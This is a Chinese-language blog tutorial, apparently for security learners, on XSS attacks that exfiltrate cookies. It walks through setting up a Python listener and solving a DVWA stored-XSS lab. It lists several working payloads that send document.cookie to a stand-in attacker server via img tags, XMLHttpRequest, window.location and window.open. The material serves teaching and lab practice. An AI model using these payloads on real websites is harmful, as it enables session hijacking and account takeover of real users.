---
title: "[网络安全]XSS之Cookie外带攻击姿势详析"
source: "https://www.cnblogs.com/qiushuo/p/17454482.html"
author:
  - "[[秋说]]"
published: 2023-05-19
created: 2025-06-09
description: "目录 概念 姿势及Payload 启动HTTP协议 method1 启动HTTP协议 method2 例题详析 Payload1 Payload2 window.open 总结 概念 XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通"
tags:
  - "clippings"
---
[![](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a32f2de6953cc1287965374ec24bc047.jpg)](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/a32f2de6953cc1287965374ec24bc047.jpg)

---

## 概念

XSS 的 Cookie 外带攻击就是一种针对 Web 应用程序中的 XSS（跨站脚本攻击）漏洞进行的攻击，攻击者通过在 XSS 攻击中注入恶意脚本，从而 **窃取用户的 Cookie 信息** 。

攻击者通常会利用已经存在的 XSS 漏洞，在受害者的浏览器上注入恶意代码，并 **将受害者的 Cookie 数据上传到攻击者控制的服务器上** ，然后攻击者就可以使用该 Cookie 来 `冒充受害者` ，执行一些恶意操作，例如盗取用户的账户信息、发起钓鱼攻击等。

---

## 姿势及Payload

XSS 的 Cookie 外带攻击分为

- 在输入框中注入恶意代码
- 在 URL 中注入特定的参数或路径来触发
- 其它方法
1. 在输入框中注入恶意代码的方式可能包括：在 `评论框、留言框、搜索框` 等用户输入区域中插入可执行的 JavaScript 代码，或者在提交表单时篡改表单字段、注入恶意脚本等。当用户提交表单时，恶意代码被执行并将 Cookie 数据上传到攻击者的服务器上。
2. 在 URL 中注入恶意参数或路径的方式通常包括： `将包含恶意脚本的 URL 发送给受害者，或者将其嵌入到网站的页面中` ，并欺骗受害者点击该链接。一旦受害者点击了该链接，则可触发 XSS 漏洞，从而实现 Cookie 外带攻击。
3. 其他的触发方式，包括：

通过恶意广告：攻击者可以将恶意脚本插入到广告代码中，然后在网站上显示这段广告。当用户 `点击该广告或鼠标移动到该广告区域时` ，恶意代码被执行，从而触发 XSS 攻击。

通过 CSRF 攻击：攻击者可以在已登录的用户浏览器中执行 ` CSRF（跨站请求伪造）攻击` ，并在攻击载荷中注入恶意 XSS 代码。当用户访问包含恶意代码的页面时，会触发 XSS 攻击。

通过文件上传：攻击者可以在 Web 应用程序中 `上传包含恶意脚本的文件` ，例如图片、文档或视频等。当用户下载并打开该文件时，恶意代码被执行，从而触发 XSS 攻击。

**在使用XSS语句将Cookie外带到攻击者IP地址前，需要在攻击机上起一个http协议，使得目标机能够将Cookie发送给该IP地址**

---

### 启动HTTP协议 method1

`本文使用本机起IP地址`

1. 使用文本编辑器（例如 Sublime Text、VS Code 等）创建一个新的 Python 文件。
2. 导入 socket 库。socket 库是 Python 标准库的一部分，提供了网络编程相关的 API 和函数。
	```python
	import socket
	```
3. 选择一个主机地址和端口号来监听连接请求。主机地址可以是 IP 地址或域名。你可以选择任何未使用的端口号作为监听端口。
	```python
	HOST = 'localhost'  # 或者使用本机的 IP 地址，如 '192.168.1.2'
	PORT = 8000 #或2023、2020
	```
4. 需要创建一个 socket 对象。可以使用 `socket()` 函数来创建一个 socket 对象，并指定协议族（例如 `AF_INET` ），以及套接字类型（例如 `SOCK_STREAM` ）。
	```python
	server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	```
5. 绑定主机地址和端口号到 socket 对象上。可以使用 `bind()` 函数来绑定主机地址和端口号。
	```python
	server_socket.bind((HOST, PORT))
	```
6. 开始监听连接请求。可以使用 `listen()` 函数来开始监听连接请求。传入的参数表示最大等待连接数。
	```python
	server_socket.listen(2)
	```

综合起来，一个简单的启动 IP 地址的 Python 代码如下所示：

```python
import socket

HOST = '本机IP地址'
PORT = 2022

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# 创建一个服务器套接字，使用 IPv4 地址族（AF_INET）和 TCP 传输协议（SOCK_STREAM）
server_socket.bind((HOST, PORT))
# 将服务器套接字与特定的主机地址和端口号进行绑定，以便客户端能够找到它
server_socket.listen(1)

print('等待客户端连接...')

# 接受客户端连接
client_socket, addr = server_socket.accept()
print('客户端已连接：', addr)

# 接收客户端发送的数据
data = client_socket.recv(1024)
print('接收到数据：', data.decode())

# 将接收到的数据原样返回给客户端
client_socket.sendall(data)

# 关闭客户端连接
client_socket.close()
# 使用 close() 方法关闭套接字并释放所有相关的资源；

# 关闭服务器套接字
server_socket.close()
# 使用 close() 方法关闭套接字并释放所有相关的资源。
```
- 一旦有客户端连接，accept() 方法会返回一个新的客户端套接字和客户端地址信息（包括 IP 地址和端口号）
- recv() 方法会阻塞程序，直到有数据可用或者超时，然后将接收到的数据作为 Python 字节对象返回。在本例中，客户端发送的数据最大为 1024 字节；
- 将接收到的数据原样发送回客户端，使用 sendall() 方法向客户端套接字写入数据。

**注意，sendall() 方法保证能够将所有数据发送出去，因此不需要循环调用其它方法来确保消息完整发送**

接着，使用 Python 解释器来执行该文件。可以通过终端或命令提示符进入包含该文件的目录，并使用 python 命令后跟文件名来运行该文件，例如：

```python
python test.py
```

其中， `test.py ` 是 Python 文件的文件名。执行后，服务器将启动并开始监听指定的 IP 地址和端口号，等待客户端连接。

最后， **在页面执行 XSS 的 Cookie外带攻击，使目标机向指定的IP地址发送Cookie，监听的端口即可接收。**

---

### 启动HTTP协议 method2

打开python2终端输入：

```python
python2 -m SimpleHTTPServer 8080(端口号)
```

打开python3终端输入：

```python
python3 -m http.server 8080(端口号)
```

**即可监听8080端口，接受XSS语句外带的Cookie**

---

以下是一些常见的 XSS 的 Cookie 外带攻击语句：

1. 利用 document.cookie 获取当前域下所有 cookie 的值：

`<script>new Image().src="http://attacker-site.com/cookie.php?cookie="+document.cookie;</script>`

1. 将当前页面的 URL 和 Cookie 发送到攻击者的服务器：

`<img src="http://attacker-site.com/logger.php?url="+encodeURIComponent(document.location.href)+"&cookie="+encodeURIComponent(document.cookie)" />`

1. 利用 XMLHttpRequest 对象发送 HTTP 请求，将 Cookie 数据发送到攻击者的服务器：

`<script>var xhr = new XMLHttpRequest(); xhr.open("POST", "http://attacker-site.com/logger.php", true); xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); xhr.send('url=' + encodeURIComponent(document.location.href) + '&cookie=' + encodeURIComponent(document.cookie));</script>`

1. 利用 window.location 对象向攻击者的服务器提交请求，附带当前页面的 URL 和 Cookie：

`<script>window.location="http://attacker-site.com/logger.php?url="+encodeURIComponent(document.location.href)+"&cookie="+encodeURIComponent(document.cookie);</script>`

1. 利用 document.write 返回页面中的Cookie，并将其拼接到目标URL中，作为参数发送到指定的 IP 地址和端口

`<script>document.write('<img src="http://ip:端口号/'+document.cookie+'"/>')</script>`

1. 通过 window.open 方法打开了指定的攻击机地址，并拼接、传递cookie

`<img src=1 onerror=window.open("http://ip:端口号/?id="+document.cookie)>`

## 例题详析

本文以 **DVWA之XSS(Stored) low-level为例** ，通过DVWA本地环境进行XSS之Cookie外带例题详析。

1. 写入python文件，以 **test.py** 命名，IP为 **本机IPv4地址** ，端口为 **2022** ，启动监听  
	![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/86aee2a0fce67518cfae10a740b8b862.png)
2. 在页面执行 XSS 的 Cookie外带攻击，使目标机向指定的IP地址发送Cookie

### Payload1

Name栏输入： `1`  
Message栏输入： `<script>document.write('<img src="http://IPv4地址:2022/'+document.cookie+'"/>')</script>`

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/27534b8dc2f65963e67017297d98011d.png)  
绕过Message栏的字符串长度限制可参考：  
[\[网络安全\]DVWA之XSS(Stored)攻击姿势及解题详析合集  
](https://blog.csdn.net/2301_77485708/article/details/130744511?spm=1001.2014.3001.5501)

如下图，XSS语句注入成功：  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/c6777fda063881b0c29738291941180d.png)

端口监听到数据：

![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/fbfad8d18190e131f6f4a721a264bb7e.png)

### Payload2

`<img src=1 onerror=window.open("http://IPv4地址:2022/?id="+document.cookie)>`  
使用 onerror 事件的方式，在图片加载失败时触发一个错误事件，通过 window.open 方法打开了指定的攻击机地址，并传递cookie

#### window.open

`window.open()` 是 JavaScript 中用于 **打开新窗口或新标签页** 的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象。在实际应用中，可以使用该方法来实现各种功能，如显示广告、打开弹窗、播放视频等。

例如，以下代码将会在新窗口或新标签页中打开指定 URL：

```javascript
window.open("http://www.example.com");
```

除了 URL 参数之外，还可以传递一些可选的参数，如窗口大小、位置、工具栏和滚动条等属性。例如：

```javascript
window.open("http://www.example.com",
            "myWindow",
            "width=400,height=300,left=100,top=100,toolbar=yes,scrollbars=yes");
```

---

如下图，XSS语句注入成功：  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/faa4777a405986d8f05e57a46f80a495.png)

页面跳转并传递cookie：  
![在这里插入图片描述](https://cdn.jsdelivr.net/gh/halcyon098/study-img/migrated/5d64ee4b7ff2d7cbaa20bc80259920c5.png)

---

## 总结

`以上为[网络安全]XSS之Cookie外带攻击姿势及例题详析，读者可躬身实践，`  
DVWA之XSS相关：  
[\[网络安全\]DVWA之XSS(Stored)攻击姿势及解题详析合集  
](https://blog.csdn.net/2301_77485708/article/details/130744511?spm=1001.2014.3001.5501)

[\[网络安全\]DVWA之XSS(Reflected)攻击姿势及解题详析合集  
](https://blog.csdn.net/2301_77485708/article/details/130736436?spm=1001.2014.3001.5501)

[\[网络安全\]DVWA之XSS(DOM)攻击姿势及解题详析合集](https://blog.csdn.net/2301_77485708/article/details/130694823?spm=1001.2014.3001.5501)

我是 **秋说** ，我们下次见。

本文作者：秋说

本文链接：https://www.cnblogs.com/qiushuo/p/17454482.html

版权声明：本作品采用知识共享署名-非商业性使用-禁止演绎 2.5 中国大陆 许可协议 进行许可。